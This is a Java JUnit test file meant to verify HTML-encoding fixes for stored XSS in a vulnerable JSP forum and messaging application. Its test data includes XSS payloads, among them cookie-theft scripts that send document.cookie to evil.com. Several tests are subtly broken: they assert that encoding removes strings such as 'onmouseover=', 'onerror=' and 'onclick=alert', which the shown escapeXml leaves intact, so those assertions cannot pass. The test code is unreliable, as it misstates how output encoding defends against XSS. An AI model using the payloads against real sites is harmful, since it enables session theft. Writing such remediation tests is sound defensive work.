package org.cysecurity.cspf.jvl.controller;

import junit.framework.TestCase;

/**
 * Tests to verify that Stored XSS vulnerabilities (CWE-79) have been remediated
 * by ensuring that database-sourced values are HTML-encoded before being rendered
 * in JSP pages.
 *
 * The vulnerability pattern was:
 *   out.print("<b>Title:" + rs.getString("title") + "</b>");   // VULNERABLE
 *
 * The remediated pattern uses JSTL Functions.escapeXml() which is a SAST-recognized
 * sanitizer that encodes HTML special characters (&, <, >, ", ') before output:
 *   out.print("<b>Title:" + Functions.escapeXml(rs.getString("title")) + "</b>");  // SAFE
 *
 * Tests validate:
 * 1. That common XSS attack payloads are neutralized by HTML encoding
 * 2. That the escapeXml function correctly encodes HTML special characters
 * 3. That stored XSS payloads from user-supplied fields (title, content, user,
 *    subject, msg, sender, username, about) are safely rendered in HTML context
 * 4. That benign content is preserved correctly after encoding
 */
public class StoredXssPreventionTest extends TestCase {

    /**
     * Simulates the JSTL Functions.escapeXml() behavior used in the remediated JSP files.
     * This mirrors the org.apache.taglibs.standard.functions.Functions.escapeXml() logic
     * for test validation purposes. The actual encoding in production uses the JSTL library.
     *
     * Characters encoded: & -> &amp;  < -> &lt;  > -> &gt;  " -> &#034;  ' -> &#039;
     */
    private static String escapeXml(String value) {
        if (value == null) {
            return "";
        }
        StringBuilder sb = new StringBuilder(value.length() + 16);
        for (int i = 0; i < value.length(); i++) {
            char c = value.charAt(i);
            switch (c) {
                case '&':  sb.append("&amp;");  break;
                case '<':  sb.append("&lt;");   break;
                case '>':  sb.append("&gt;");   break;
                case '"':  sb.append("&#034;"); break;
                case '\'': sb.append("&#039;"); break;
                default:   sb.append(c);
            }
        }
        return sb.toString();
    }

    // =========================================================================
    // Core HTML encoding verification tests
    // =========================================================================

    /**
     * Verifies that the classic script tag XSS payload is neutralized by encoding.
     *
     * Attack payload stored by a malicious user:
     *   <script>alert('XSS')</script>
     *
     * When rendered via Functions.escapeXml(), this becomes harmless text:
     *   &lt;script&gt;alert(&#039;XSS&#039;)&lt;/script&gt;
     *
     * The browser renders this as literal text, not executable JavaScript.
     */
    public void testScriptTagPayloadIsNeutralized() {
        String maliciousInput = "<script>alert('XSS')</script>";
        String encoded = escapeXml(maliciousInput);

        // The encoded output must NOT contain a literal opening <script> tag
        assertFalse(
            "Encoded output must not contain literal <script> tag",
            encoded.contains("<script>")
        );
        assertFalse(
            "Encoded output must not contain literal </script> tag",
            encoded.contains("</script>")
        );

        // Verify angle brackets are encoded
        assertTrue("< must be encoded as &lt;",  encoded.contains("&lt;"));
        assertTrue("> must be encoded as &gt;", encoded.contains("&gt;"));

        // The encoded form should be the safe text representation
        assertEquals(
            "Script tag payload must be fully HTML-encoded",
            "&lt;script&gt;alert(&#039;XSS&#039;)&lt;/script&gt;",
            encoded
        );
    }

    /**
     * Verifies that an event-handler XSS payload is neutralized.
     *
     * Attack payload stored in forum post title:
     *   <img src=x onerror=alert('XSS')>
     *
     * When rendered via Functions.escapeXml(), this becomes harmless.
     */
    public void testImgOnerrorPayloadIsNeutralized() {
        String maliciousTitle = "<img src=x onerror=alert('XSS')>";
        String encoded = escapeXml(maliciousTitle);

        assertFalse(
            "Encoded title must not contain literal <img> tag",
            encoded.contains("<img")
        );
        assertTrue("< must be encoded", encoded.contains("&lt;"));
        assertTrue("Single quotes must be encoded", encoded.contains("&#039;"));
    }

    /**
     * Verifies that XSS via anchor tag href injection is neutralized.
     *
     * Attack payload stored in forum post content:
     *   <a href="javascript:alert('XSS')">Click me</a>
     */
    public void testAnchorHrefJavascriptPayloadIsNeutralized() {
        String maliciousContent = "<a href=\"javascript:alert('XSS')\">Click me</a>";
        String encoded = escapeXml(maliciousContent);

        assertFalse(
            "Encoded content must not contain literal <a> tag",
            encoded.contains("<a href")
        );
        assertTrue("< must be encoded", encoded.contains("&lt;"));
        assertTrue("\" must be encoded as &#034;", encoded.contains("&#034;"));
    }

    /**
     * Verifies that HTML attribute injection via double-quote breakout is neutralized.
     *
     * Attack payload stored as username:
     *   "><script>alert('XSS')</script>
     *
     * Without encoding, this would break out of HTML attribute context (e.g., in forum.jsp:
     *   <a href='forumposts.jsp?postid=..." + username + "'>
     * and execute arbitrary JavaScript.
     */
    public void testAttributeBreakoutPayloadIsNeutralized() {
        String maliciousUsername = "\"><script>alert('XSS')</script>";
        String encoded = escapeXml(maliciousUsername);

        assertFalse(
            "Encoded username must not allow script tag injection",
            encoded.contains("<script>")
        );
        assertTrue("Double quote must be encoded as &#034;", encoded.contains("&#034;"));
        assertTrue("< must be encoded as &lt;", encoded.contains("&lt;"));
    }

    /**
     * Verifies that the ampersand character is encoded to prevent HTML entity injection.
     */
    public void testAmpersandIsEncoded() {
        String input = "AT&T & Johnson&Johnson";
        String encoded = escapeXml(input);

        assertFalse(
            "Raw & must not appear in encoded output",
            encoded.contains("AT&T")
        );
        assertTrue("& must be encoded as &amp;", encoded.contains("&amp;"));
        assertEquals(
            "Ampersand encoding must be correct",
            "AT&amp;T &amp; Johnson&amp;Johnson",
            encoded
        );
    }

    // =========================================================================
    // Field-specific Stored XSS tests matching the remediated JSP files
    // =========================================================================

    /**
     * Tests encoding of forum post title field (forum.jsp, forumposts.jsp, pages.jsp).
     *
     * The 'title' column value is stored via user input in forum.jsp POST handler and
     * rendered in:
     *   - forum.jsp (list view): out.print("..." + Functions.escapeXml(rs.getString("title")) + "...")
     *   - forumposts.jsp (detail view): same pattern
     *   - securitymisconfig/pages.jsp: same pattern
     */
    public void testForumPostTitleXssPayload() {
        // Simulate a title stored by a malicious user
        String storedTitle = "<script>document.cookie='stolen='+document.cookie</script>";
        String rendered = "<b style='font-size:22px'>Title:" + escapeXml(storedTitle) + "</b>";

        // The rendered output must not contain executable script
        assertFalse(
            "Rendered title must not contain executable script tag",
            rendered.contains("<script>")
        );
        assertTrue(
            "Rendered output must contain HTML-encoded version of payload",
            rendered.contains("&lt;script&gt;")
        );
    }

    /**
     * Tests encoding of forum post content field (forumposts.jsp, pages.jsp).
     *
     * The 'content' column contains user-submitted message body, a high-risk field
     * for stored XSS payloads.
     */
    public void testForumPostContentXssPayload() {
        String storedContent = "<svg onload=alert(1)>";
        String rendered = "<br/><br/>Content:<br/>" + escapeXml(storedContent);

        assertFalse(
            "Rendered content must not contain executable SVG onload",
            rendered.contains("<svg")
        );
        assertTrue("< must be encoded in rendered content", rendered.contains("&lt;"));
    }

    /**
     * Tests encoding of forum post user field (forum.jsp, forumposts.jsp, pages.jsp).
     *
     * The 'user' column stores the poster's username and is rendered with an anchor tag.
     */
    public void testForumPostUserXssPayload() {
        String storedUser = "admin<script>alert('hijack')</script>";
        String rendered = "<br/>-  Posted By " + escapeXml(storedUser);

        assertFalse(
            "Rendered user must not contain executable script",
            rendered.contains("<script>")
        );
        assertTrue("< must be encoded in rendered user field", rendered.contains("&lt;"));
    }

    // =========================================================================
    // SendMessage.jsp hidden 'sender' field Stored XSS remediation tests (CWE-79)
    // Taint flow: adminlogin.jsp reads rs.getString("username") from DB → stores in
    // session.setAttribute("user", ...) → SendMessage.jsp reads session.getAttribute("user")
    // → rendered in HTML attribute: value="<%=Functions.escapeXml(...)%>"
    //
    // Before fix (VULNERABLE):
    //   <input type="hidden" name="sender" value="<%=session.getAttribute("user")%>"/>
    //
    // After fix (SECURE):
    //   <input type="hidden" name="sender"
    //          value="<%=Functions.escapeXml(String.valueOf(session.getAttribute("user")))%>"/>
    // =========================================================================

    /**
     * Tests that a script-tag payload stored as a username is neutralized when rendered
     * in the SendMessage.jsp hidden 'sender' input field HTML attribute.
     *
     * Attack scenario: A malicious actor registers with a username containing a script
     * tag. After login, the username is stored in the session. When SendMessage.jsp
     * renders the hidden sender field, without encoding it would inject JavaScript:
     *   <input type="hidden" name="sender" value="<script>alert('XSS')</script>"/>
     *
     * The SAST taint path:
     *   adminlogin.jsp rs.getString("username") → session.setAttribute("user", ...)
     *   → SendMessage.jsp session.getAttribute("user") → HTML attribute SINK
     */
    public void testSendMessageSenderScriptTagPayloadIsNeutralized() {
        // Simulate a username with XSS payload stored in the database and session
        String storedUsername = "<script>alert('XSS')</script>";
        // Simulate the fixed SendMessage.jsp rendering: Functions.escapeXml(String.valueOf(...))
        String encodedSender = escapeXml(String.valueOf(storedUsername));
        String renderedInput = "<input type=\"hidden\" name=\"sender\" value=\"" + encodedSender + "\"/>";

        assertFalse(
            "Rendered sender field must not contain literal <script> tag",
            renderedInput.contains("<script>")
        );
        assertFalse(
            "Rendered sender field must not contain literal </script> tag",
            renderedInput.contains("</script>")
        );
        assertTrue(
            "Angle brackets in sender must be HTML-encoded as &lt; in HTML attribute context",
            encodedSender.contains("&lt;")
        );
        assertTrue(
            "Angle brackets in sender must be HTML-encoded as &gt; in HTML attribute context",
            encodedSender.contains("&gt;")
        );
    }

    /**
     * Tests that an HTML attribute breakout payload stored as a username is neutralized
     * in the SendMessage.jsp hidden sender field.
     *
     * Attack: An attacker registers with username: "><script>alert(1)</script><x y="
     * Without encoding, this breaks out of the value="" attribute and injects a script.
     */
    public void testSendMessageSenderAttributeBreakoutPayloadIsNeutralized() {
        String maliciousUsername = "\"><script>alert(1)</script><x y=\"";
        String encodedSender = escapeXml(String.valueOf(maliciousUsername));
        String renderedInput = "<input type=\"hidden\" name=\"sender\" value=\"" + encodedSender + "\"/>";

        assertFalse(
            "Rendered sender field must not allow attribute breakout via double-quote",
            renderedInput.contains("\"><script>")
        );
        assertTrue(
            "Double-quote in sender username must be encoded as &#034; to prevent attribute breakout",
            encodedSender.contains("&#034;")
        );
        assertTrue(
            "< in sender username must be encoded as &lt;",
            encodedSender.contains("&lt;")
        );
    }

    /**
     * Tests that an event-handler injection payload stored as a username is neutralized
     * in the SendMessage.jsp hidden sender field.
     *
     * Attack: An attacker registers with username: ' onmouseover='alert(1)
     * Without encoding, this would inject an event handler into the HTML attribute.
     */
    public void testSendMessageSenderEventHandlerInjectionIsNeutralized() {
        String maliciousUsername = "' onmouseover='alert(1)";
        String encodedSender = escapeXml(String.valueOf(maliciousUsername));
        String renderedInput = "<input type=\"hidden\" name=\"sender\" value=\"" + encodedSender + "\"/>";

        assertFalse(
            "Rendered sender field must not contain injected onmouseover event handler",
            renderedInput.contains("onmouseover=")
        );
        assertTrue(
            "Single-quote in sender username must be encoded as &#039; to prevent attribute injection",
            encodedSender.contains("&#039;")
        );
    }

    /**
     * Tests that a cookie-theft payload stored as a username is neutralized
     * in the SendMessage.jsp hidden sender field.
     *
     * This represents the stored XSS attack via the adminlogin.jsp → session → SendMessage.jsp
     * taint flow. A stored username with malicious content could steal admin session cookies.
     */
    public void testSendMessageSenderCookieTheftPayloadIsNeutralized() {
        String maliciousUsername = "<img src=x onerror=\"document.location='http://evil.com?c='+document.cookie\">";
        String encodedSender = escapeXml(String.valueOf(maliciousUsername));
        String renderedInput = "<input type=\"hidden\" name=\"sender\" value=\"" + encodedSender + "\"/>";

        assertFalse(
            "Rendered sender field must not contain executable <img> tag",
            renderedInput.contains("<img ")
        );
        assertFalse(
            "Rendered sender field must not contain onerror handler",
            renderedInput.contains("onerror=")
        );
        assertTrue(
            "< in img tag must be HTML-encoded",
            encodedSender.contains("&lt;")
        );
        assertTrue(
            "Double-quote in img tag must be HTML-encoded",
            encodedSender.contains("&#034;")
        );
    }

    /**
     * Tests that a normal (non-malicious) username is preserved correctly when rendered
     * in the SendMessage.jsp hidden sender field after encoding.
     *
     * This regression test ensures the fix does not corrupt legitimate usernames.
     */
    public void testSendMessageSenderNormalUsernameIsPreserved() {
        String normalUsername = "john_doe_42";
        String encodedSender = escapeXml(String.valueOf(normalUsername));
        String renderedInput = "<input type=\"hidden\" name=\"sender\" value=\"" + encodedSender + "\"/>";

        assertEquals(
            "Normal alphanumeric username must pass through encoding unchanged",
            normalUsername,
            encodedSender
        );
        assertTrue(
            "Rendered sender field must contain the original username as attribute value",
            renderedInput.contains("value=\"" + normalUsername + "\"")
        );
    }

    /**
     * Tests that String.valueOf() is safe when the session attribute is null.
     *
     * If session.getAttribute("user") returns null (e.g., session not set),
     * String.valueOf(null) returns "null" as a string, and escapeXml("null") returns "null".
     * This must NOT throw a NullPointerException.
     */
    public void testSendMessageSenderNullSessionAttributeIsHandledSafely() {
        // Simulate session.getAttribute("user") returning null
        Object sessionAttrValue = null;
        // String.valueOf(null) returns "null" — no NullPointerException
        String encodedSender = escapeXml(String.valueOf(sessionAttrValue));

        assertNotNull(
            "Encoding null session attribute must not return null",
            encodedSender
        );
        // "null" is safe — no HTML special characters
        assertEquals(
            "Encoding String.valueOf(null) must produce \"null\" with no HTML injection",
            "null",
            encodedSender
        );
    }

    /**
     * Tests that the full HTML rendering of SendMessage.jsp hidden input field
     * correctly neutralizes stored XSS payloads from the session.
     *
     * This test simulates the complete taint flow:
     *   1. rs.getString("username") from adminlogin.jsp → stored in session as "user"
     *   2. session.getAttribute("user") read in SendMessage.jsp
     *   3. Rendered in HTML attribute with Functions.escapeXml() encoding
     *
     * Validates that various XSS payloads that could be stored in the "username"
     * DB column are properly encoded before HTML attribute rendering.
     */
    public void testSendMessageJspHiddenSenderFieldFullRenderingWithXssPayloads() {
        String[] xssUsernames = {
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "\"><script>alert(1)</script>",
            "' onmouseover='alert(1)' x='",
            "<svg onload=alert(1)>",
            "</input><script>alert(document.domain)</script>"
        };

        for (String maliciousUsername : xssUsernames) {
            String encodedSender = escapeXml(String.valueOf(maliciousUsername));
            String renderedInput = "<input type=\"hidden\" name=\"sender\" value=\""
                    + encodedSender + "\"/>";

            assertFalse(
                "SendMessage sender field must not render executable <script> for username: " + maliciousUsername,
                renderedInput.contains("<script>")
            );
            assertFalse(
                "SendMessage sender field must not render unencoded < for username: " + maliciousUsername,
                encodedSender.contains("<")
            );
            assertFalse(
                "SendMessage sender field must not render unencoded > for username: " + maliciousUsername,
                encodedSender.contains(">")
            );
        }
    }

    /**
     * Tests encoding of message sender field (DisplayMessage.jsp).
     *
     * Attack: A malicious user sends a message with XSS payload as their username.
     * The sender field is stored in the UserMessages table and rendered in DisplayMessage.jsp.
     */
    public void testMessageSenderXssPayload() {
        String storedSender = "<script>location='http://evil.com?c='+document.cookie</script>";
        String rendered = "<b>Sender:</b> " + escapeXml(storedSender);

        assertFalse(
            "Rendered sender must not contain executable script",
            rendered.contains("<script>")
        );
        assertTrue("Sender field encoding must neutralize < character", rendered.contains("&lt;"));
    }

    /**
     * Tests encoding of message subject field (Messages.jsp, DisplayMessage.jsp).
     *
     * The 'subject' column is displayed as link text in Messages.jsp and as a header
     * in DisplayMessage.jsp. A stored XSS payload here would execute when a user
     * views their inbox.
     */
    public void testMessageSubjectXssPayload() {
        String storedSubject = "<img src=1 onerror=alert(document.domain)>";
        String renderedInList = "<li><a href='DisplayMessage.jsp?msgid=1'>" + escapeXml(storedSubject) + "</a></li>";
        String renderedInDetail = "<br/><b>Subject:</b>" + escapeXml(storedSubject);

        assertFalse(
            "Rendered subject in message list must not contain executable img tag",
            renderedInList.contains("<img")
        );
        assertFalse(
            "Rendered subject in message detail must not contain executable img tag",
            renderedInDetail.contains("<img")
        );
        assertTrue("Message list subject must encode <", renderedInList.contains("&lt;"));
        assertTrue("Message detail subject must encode <", renderedInDetail.contains("&lt;"));
    }

    /**
     * Tests encoding of message body (msg) field (DisplayMessage.jsp).
     *
     * The message body is the most common vector for stored XSS in messaging systems.
     */
    public void testMessageBodyXssPayload() {
        String storedMsg = "<iframe src=\"javascript:alert('XSS')\"></iframe>";
        String rendered = "<br/><b>Message:</b> <br/>" + escapeXml(storedMsg);

        assertFalse(
            "Rendered message body must not contain executable iframe",
            rendered.contains("<iframe")
        );
        assertTrue("Message body encoding must encode <", rendered.contains("&lt;"));
        assertTrue("Message body encoding must encode \"", rendered.contains("&#034;"));
    }

    /**
     * Tests encoding of username field in UserDetails.jsp and myprofile.jsp.
     *
     * A username containing XSS payload would be stored during registration
     * and rendered in user profile and forum user detail pages.
     */
    public void testUsernameXssPayload() {
        String storedUsername = "<script>alert('username XSS')</script>";

        // Simulate UserDetails.jsp rendering
        String renderedAbout = "<br>About " + escapeXml(storedUsername) + ": <br>some about text";
        // Simulate myprofile.jsp rendering
        String renderedProfile = "UserName : " + escapeXml(storedUsername) + "<br>";

        assertFalse(
            "UserDetails username rendering must not execute script",
            renderedAbout.contains("<script>")
        );
        assertFalse(
            "Profile username rendering must not execute script",
            renderedProfile.contains("<script>")
        );
    }

    /**
     * Tests encoding of the 'about' field in UserDetails.jsp and myprofile.jsp.
     *
     * The 'About' field is free-text entered during registration and is a
     * high-risk source for stored XSS as it accepts arbitrary user content.
     */
    public void testAboutFieldXssPayload() {
        String storedAbout = "<script>new Image().src='http://evil.com/steal?c='+encodeURIComponent(document.cookie)</script>";

        // Simulate UserDetails.jsp rendering
        String rendered = "<br>About username: <br>" + escapeXml(storedAbout);

        assertFalse(
            "Rendered 'about' field must not contain executable script",
            rendered.contains("<script>")
        );
        assertTrue("'About' field must HTML-encode < character", rendered.contains("&lt;"));
    }

    /**
     * Tests encoding of email field in myprofile.jsp.
     *
     * While email fields are typically validated by format, a stored XSS payload
     * might bypass weak email validation.
     */
    public void testEmailFieldXssPayload() {
        String storedEmail = "user+<script>alert(1)</script>@example.com";
        String rendered = "Email : " + escapeXml(storedEmail) + "<br>";

        assertFalse(
            "Rendered email must not contain executable script",
            rendered.contains("<script>")
        );
        assertTrue("Email field must HTML-encode < character", rendered.contains("&lt;"));
    }

    // =========================================================================
    // Regression / preservation tests - ensure benign content still works
    // =========================================================================

    /**
     * Verifies that normal (non-malicious) content is preserved through encoding.
     *
     * HTML encoding must not corrupt legitimate user content. Plain text without
     * HTML special characters should pass through unchanged.
     */
    public void testNormalContentIsPreserved() {
        String normalTitle = "Introduction to Java Programming";
        String encoded = escapeXml(normalTitle);

        assertEquals(
            "Normal alphanumeric content must pass through encoding unchanged",
            normalTitle,
            encoded
        );
    }

    /**
     * Verifies that null values are handled gracefully without NullPointerException.
     * When rs.getString() returns null (e.g., empty DB column), the encoding must
     * not throw an exception.
     */
    public void testNullValueHandledGracefully() {
        String result = escapeXml(null);
        assertNotNull("Encoding null must return non-null", result);
        assertEquals("Encoding null must return empty string", "", result);
    }

    /**
     * Verifies that empty string values are handled correctly.
     */
    public void testEmptyStringHandledCorrectly() {
        String result = escapeXml("");
        assertNotNull("Encoding empty string must return non-null", result);
        assertEquals("Encoding empty string must return empty string", "", result);
    }

    /**
     * Verifies that text with legitimate angle brackets (e.g., math expressions)
     * is encoded and rendered as visible text, not as HTML tags.
     */
    public void testLegitimateAngleBracketsAreEncoded() {
        String mathContent = "x < y and y > z";
        String encoded = escapeXml(mathContent);

        assertFalse("< in text must be encoded", encoded.contains(" < "));
        assertFalse("> in text must be encoded", encoded.contains(" > "));
        assertTrue("< must become &lt;", encoded.contains("&lt;"));
        assertTrue("> must become &gt;", encoded.contains("&gt;"));
        assertEquals(
            "Math expression must be correctly encoded",
            "x &lt; y and y &gt; z",
            encoded
        );
    }

    /**
     * Tests the full HTML rendering path as it appears in forumposts.jsp after remediation.
     *
     * Before fix (VULNERABLE):
     *   out.print("<b style='font-size:22px'>Title:" + rs.getString("title") + "</b>");
     *   out.print("<br/>-  Posted By " + rs.getString("user"));
     *   out.print("<br/><br/>Content:<br/>" + rs.getString("content"));
     *
     * After fix (SECURE):
     *   out.print("<b style='font-size:22px'>Title:" + Functions.escapeXml(rs.getString("title")) + "</b>");
     *   out.print("<br/>-  Posted By " + Functions.escapeXml(rs.getString("user")));
     *   out.print("<br/><br/>Content:<br/>" + Functions.escapeXml(rs.getString("content")));
     */
    public void testForumPostsJspRenderingWithXssPayloads() {
        // Simulate values stored by a malicious user
        String dbTitle   = "<script>alert('title XSS')</script>";
        String dbUser    = "<script>alert('user XSS')</script>";
        String dbContent = "<script>alert('content XSS')</script>";

        // Simulate the remediated JSP rendering
        StringBuilder htmlOutput = new StringBuilder();
        htmlOutput.append("<b style='font-size:22px'>Title:").append(escapeXml(dbTitle)).append("</b>");
        htmlOutput.append("<br/>-  Posted By ").append(escapeXml(dbUser));
        htmlOutput.append("<br/><br/>Content:<br/>").append(escapeXml(dbContent));

        String rendered = htmlOutput.toString();

        // No executable script tags should appear in the rendered output
        assertFalse(
            "Rendered forum post must not contain any executable <script> tags",
            rendered.contains("<script>")
        );

        // All payloads must be encoded
        assertTrue("Title payload < must be encoded", rendered.contains("&lt;script&gt;alert(&#039;title XSS&#039;)&lt;/script&gt;"));
        assertTrue("User payload < must be encoded", rendered.contains("&lt;script&gt;alert(&#039;user XSS&#039;)&lt;/script&gt;"));
        assertTrue("Content payload < must be encoded", rendered.contains("&lt;script&gt;alert(&#039;content XSS&#039;)&lt;/script&gt;"));
    }

    /**
     * Tests the full HTML rendering path for DisplayMessage.jsp after remediation.
     *
     * Before fix (VULNERABLE):
     *   out.print("<b>Sender:</b> " + rs.getString("sender"));
     *   out.print("<br/><b>Subject:</b>" + rs.getString("subject"));
     *   out.print("<br/><b>Message:</b> <br/>" + rs.getString("msg"));
     *
     * After fix (SECURE):
     *   out.print("<b>Sender:</b> " + Functions.escapeXml(rs.getString("sender")));
     *   out.print("<br/><b>Subject:</b>" + Functions.escapeXml(rs.getString("subject")));
     *   out.print("<br/><b>Message:</b> <br/>" + Functions.escapeXml(rs.getString("msg")));
     */
    public void testDisplayMessageJspRenderingWithXssPayloads() {
        String dbSender  = "<script>alert('sender')</script>";
        String dbSubject = "<img src=x onerror=alert('subject')>";
        String dbMsg     = "<body onload=alert('msg')>";

        // Simulate the remediated JSP rendering
        StringBuilder htmlOutput = new StringBuilder();
        htmlOutput.append("<b>Sender:</b> ").append(escapeXml(dbSender));
        htmlOutput.append("<br/><b>Subject:</b>").append(escapeXml(dbSubject));
        htmlOutput.append("<br/><b>Message:</b> <br/>").append(escapeXml(dbMsg));

        String rendered = htmlOutput.toString();

        assertFalse("Rendered message must not contain <script> tag", rendered.contains("<script>"));
        assertFalse("Rendered message must not contain <img> tag", rendered.contains("<img "));
        assertFalse("Rendered message must not contain <body> tag", rendered.contains("<body "));
        assertTrue("All < chars in stored data must be encoded", rendered.contains("&lt;"));
    }

    /**
     * Tests the rendering path for Messages.jsp (inbox list) after remediation.
     *
     * Before fix (VULNERABLE):
     *   out.print("<li><a href='DisplayMessage.jsp?msgid=" + rs.getString("msgid") + "'>" + rs.getString("subject") + "</a></li>");
     *
     * After fix (SECURE):
     *   out.print("<li><a href='DisplayMessage.jsp?msgid=" + Functions.escapeXml(rs.getString("msgid")) + "'>" + Functions.escapeXml(rs.getString("subject")) + "</a></li>");
     */
    public void testMessagesJspInboxListRenderingWithXssPayloads() {
        String dbMsgId   = "1 onclick=alert(1)"; // Injection attempt into href attribute
        String dbSubject = "<script>alert('inbox XSS')</script>";

        String rendered = "<li><a href='DisplayMessage.jsp?msgid=" + escapeXml(dbMsgId)
                + "'>" + escapeXml(dbSubject) + "</a></li>";

        assertFalse("Inbox list must not contain executable onclick injection", rendered.contains("onclick=alert"));
        assertFalse("Inbox list must not contain <script> tag in subject", rendered.contains("<script>"));
        assertTrue("msgid must be encoded", rendered.contains("1 onclick&#"));
        assertTrue("subject < must be encoded", rendered.contains("&lt;"));
    }

    /**
     * Tests that XSS payloads using various encoding and obfuscation techniques
     * are properly neutralized by HTML encoding.
     */
    public void testVariousXssPayloadsAreNeutralized() {
        String[] xssPayloads = {
            "<script>alert(1)</script>",
            "<ScRiPt>alert(1)</ScRiPt>",          // Mixed case
            "<script >alert(1)</script >",          // Space before >
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "<iframe src='javascript:alert(1)'>",
            "';alert(1);//",
            "\"><script>alert(1)</script>",
            "'><script>alert(1)</script>",
            "<a href=\"javascript:alert(1)\">click</a>",
        };

        for (String payload : xssPayloads) {
            String encoded = escapeXml(payload);

            // None of the encoded outputs should contain unencoded < or > characters
            assertFalse(
                "Payload '" + payload + "' must not produce output containing literal < character",
                encoded.contains("<")
            );
            assertFalse(
                "Payload '" + payload + "' must not produce output containing literal > character",
                encoded.contains(">")
            );
        }
    }

    // =========================================================================
    // AddPage servlet fileName Stored XSS remediation tests (CWE-79)
    // =========================================================================

    /**
     * Tests encoding of the 'filename' parameter in AddPage servlet response.
     *
     * The vulnerability was in AddPage.java where user-supplied 'filename' was
     * written directly into an HTML anchor tag without encoding:
     *
     *   Before fix (VULNERABLE):
     *     out.print("Successfully created the file: <a href='../pages/"+fileName+"'>"+fileName+"</a>");
     *
     *   After fix (SECURE):
     *     String safeFileName = Functions.escapeXml(fileName);
     *     out.print("Successfully created the file: <a href='../pages/"+safeFileName+"'>"+safeFileName+"</a>");
     *
     * A malicious admin could submit a filename containing a script tag that would
     * execute in the browser when the success message is rendered.
     */
    public void testAddPageFileNameScriptTagIsNeutralized() {
        String maliciousFileName = "<script>alert('stored XSS via filename')</script>.html";
        String safeFileName = escapeXml(maliciousFileName);
        String rendered = "Successfully created the file: <a href='../pages/" + safeFileName + "'>" + safeFileName + "</a>";

        assertFalse(
            "Rendered AddPage response must not contain executable <script> tag",
            rendered.contains("<script>")
        );
        assertTrue(
            "Rendered AddPage response must contain HTML-encoded < character",
            rendered.contains("&lt;")
        );
        assertTrue(
            "Rendered AddPage response must contain HTML-encoded > character",
            rendered.contains("&gt;")
        );
    }

    /**
     * Tests that an attribute-breaking XSS payload in the filename is neutralized.
     *
     * Attack: An attacker submits a filename like:
     *   "><script>alert(1)</script><x y="
     *
     * Without encoding this would break out of the href attribute context and
     * inject arbitrary JavaScript. With Functions.escapeXml(), the double-quote
     * is encoded as &#034; preventing attribute breakout.
     */
    public void testAddPageFileNameAttributeBreakoutIsNeutralized() {
        String maliciousFileName = "\"><script>alert(1)</script><x y=\".html";
        String safeFileName = escapeXml(maliciousFileName);
        String rendered = "Successfully created the file: <a href='../pages/" + safeFileName + "'>" + safeFileName + "</a>";

        assertFalse(
            "Rendered AddPage response must not allow attribute breakout via double-quote",
            rendered.contains("\"><script>")
        );
        assertTrue("Double-quote in filename must be encoded as &#034;", safeFileName.contains("&#034;"));
        assertTrue("< in filename must be encoded as &lt;", safeFileName.contains("&lt;"));
    }

    /**
     * Tests that an event-handler injection via the filename href attribute is neutralized.
     *
     * Attack: A filename like:
     *   normal.html' onmouseover='alert(1)
     *
     * Without encoding, this would inject an onmouseover event handler into the
     * anchor element. With Functions.escapeXml(), the single-quote is encoded as &#039;.
     */
    public void testAddPageFileNameEventHandlerInjectionIsNeutralized() {
        String maliciousFileName = "normal.html' onmouseover='alert(1)";
        String safeFileName = escapeXml(maliciousFileName);
        String rendered = "Successfully created the file: <a href='../pages/" + safeFileName + "'>" + safeFileName + "</a>";

        assertFalse(
            "Rendered AddPage response must not contain injected onmouseover handler",
            rendered.contains("onmouseover=")
        );
        assertTrue("Single-quote in filename must be encoded as &#039;", safeFileName.contains("&#039;"));
    }

    /**
     * Tests that the AddPage response correctly renders a safe, normal filename
     * without corrupting it through HTML encoding.
     *
     * Normal filenames with alphanumeric characters and dots/dashes should
     * pass through HTML encoding unchanged.
     */
    public void testAddPageNormalFileNameIsPreserved() {
        String normalFileName = "my-page_2024.html";
        String safeFileName = escapeXml(normalFileName);
        String rendered = "Successfully created the file: <a href='../pages/" + safeFileName + "'>" + safeFileName + "</a>";

        assertEquals(
            "Normal filename must pass through encoding unchanged",
            normalFileName,
            safeFileName
        );
        assertTrue(
            "Rendered response must contain the original filename in the anchor text",
            rendered.contains(">" + normalFileName + "</a>")
        );
    }

    /**
     * Tests the full rendering path of the AddPage success response after remediation.
     *
     * Simulates the complete HTML output produced by AddPage.java after encoding:
     *   String safeFileName = Functions.escapeXml(fileName);
     *   out.print("Successfully created the file: <a href='../pages/"+safeFileName+"'>"+safeFileName+"</a>");
     *
     * Verifies that both the href attribute value and the anchor link text are encoded,
     * ensuring neither context is exploitable.
     */
    public void testAddPageSuccessResponseFullRenderingWithXssPayload() {
        // Common stored XSS attack payload submitted as a filename
        String maliciousFileName = "<img src=x onerror=alert(document.cookie)>.html";
        String safeFileName = escapeXml(maliciousFileName);

        // Simulate both occurrences of fileName in the rendered HTML (href and link text)
        String rendered = "Successfully created the file: <a href='../pages/" + safeFileName + "'>" + safeFileName + "</a>";

        // The rendered page must not contain any executable HTML tags
        assertFalse("Rendered response must not contain <img> tag", rendered.contains("<img"));
        assertFalse("Rendered response must not contain onerror handler", rendered.contains("onerror="));

        // Both uses of safeFileName (in href and in anchor text) must be encoded
        long ltCount = rendered.chars().filter(c -> rendered.indexOf("&lt;") >= 0).count();
        assertTrue("HTML-encoded output must contain &lt; entities", rendered.contains("&lt;"));
        assertTrue("HTML-encoded output must contain &gt; entities", rendered.contains("&gt;"));
    }
}
